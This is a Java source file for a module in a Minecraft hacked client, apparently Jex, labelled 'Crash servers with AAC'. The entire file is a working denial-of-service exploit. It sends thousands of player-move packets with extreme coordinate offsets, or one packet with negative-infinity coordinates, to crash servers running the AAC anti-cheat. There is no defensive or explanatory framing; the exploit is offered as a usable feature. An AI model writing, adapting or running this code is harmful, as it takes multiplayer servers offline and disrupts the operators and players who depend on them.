package me.dustin.crash.feature;

import me.dustin.events.core.EventListener;
import me.dustin.events.core.annotate.EventPointer;
import me.dustin.jex.event.filters.PlayerPacketsFilter;
import me.dustin.jex.event.filters.TickFilter;
import me.dustin.jex.event.misc.EventTick;
import me.dustin.jex.event.player.EventPlayerPackets;
import me.dustin.jex.feature.mod.core.Feature;
import me.dustin.jex.feature.option.annotate.Op;
import me.dustin.jex.helper.misc.Wrapper;
import me.dustin.jex.helper.network.NetworkHelper;
import net.minecraft.network.packet.c2s.play.PlayerMoveC2SPacket;

@Feature.Manifest(category = Feature.Category.MISC, description = "Crash servers with AAC")
public class AACCrash extends Feature {

    @Op(name = "Mode", all = {"New", "Other", "Old"})
    public String mode = "New";
    @Op(name = "Packet Count", min = 1, max = 100000, inc = 100)
    public int packetCount = 5000;
    @Op(name = "Every Tick")
    public boolean everyTick = false;
    @Op(name = "Auto Disable")
    public boolean autoDisable = true;

    public AACCrash() {
        setFeatureCategory(Category.valueOf("CRASH"));
    }

    @Override
    public void onEnable() {
        if (Wrapper.INSTANCE.getWorld() != null && Wrapper.INSTANCE.getLocalPlayer() != null && !everyTick) {
            sendPackets();
        }
        setState(false);
    }

    @EventPointer
    private final EventListener<EventPlayerPackets> eventPlayerPacketsEventListener = new EventListener<>(eventPlayerPackets -> {
        if (everyTick)
            sendPackets();
    }, new PlayerPacketsFilter(EventPlayerPackets.Mode.PRE));

    @EventPointer
    private final EventListener<EventTick> eventTickEventListener = new EventListener<>(eventTick -> {
        if (Wrapper.INSTANCE.getWorld() == null || Wrapper.INSTANCE.getLocalPlayer() == null && autoDisable)
            setState(false);
    }, new TickFilter(EventTick.Mode.PRE));

    private void sendPackets() {
        switch (mode.toLowerCase()) {
            case "new" -> {
                for (int i = 0; i < packetCount; i++) {
                    NetworkHelper.INSTANCE.sendPacket(new PlayerMoveC2SPacket.PositionAndOnGround(Wrapper.INSTANCE.getLocalPlayer().getX() + (9412 * i), Wrapper.INSTANCE.getLocalPlayer().getY() + (9412 * i), Wrapper.INSTANCE.getLocalPlayer().getZ() + (9412 * i), true));
                }
            }
            case "other" -> {
                for (int i = 0; i < packetCount; i++) {
                    NetworkHelper.INSTANCE.sendPacket(new PlayerMoveC2SPacket.PositionAndOnGround(Wrapper.INSTANCE.getLocalPlayer().getX() + (500000 * i), Wrapper.INSTANCE.getLocalPlayer().getY() + (500000 * i), Wrapper.INSTANCE.getLocalPlayer().getZ() + (500000 * i), true));
                }
            }
            case "old" -> {
                NetworkHelper.INSTANCE.sendPacket(new PlayerMoveC2SPacket.PositionAndOnGround(Double.NEGATIVE_INFINITY, Double.NEGATIVE_INFINITY, Double.NEGATIVE_INFINITY, true));
            }
        }
    }
}
